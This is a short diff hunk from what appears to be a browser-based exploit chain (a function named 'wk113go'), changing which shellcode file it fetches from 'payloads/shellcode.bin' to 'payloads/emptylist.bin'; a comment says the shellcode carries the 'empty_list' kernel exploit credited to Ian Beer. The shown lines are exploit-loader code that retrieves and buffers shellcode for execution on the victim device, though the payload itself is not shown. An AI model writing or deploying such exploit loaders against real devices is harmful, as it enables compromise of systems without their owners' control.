@@ -431,7 +431,7 @@ var wk113go = function() {
     if(!has_offsets) return fail(-1);
     
     //retrieve the shellcode containing the empty_list exploit by Ian Beer (Needs some work, doesn't check for request status code)
-    fetch('payloads/shellcode.bin').then((response) => {
+    fetch('payloads/emptylist.bin').then((response) => {
         response.arrayBuffer().then((buffer) => {
             try{
                 shellcode_length = buffer.byteLength; //Get the length of the shellcode array
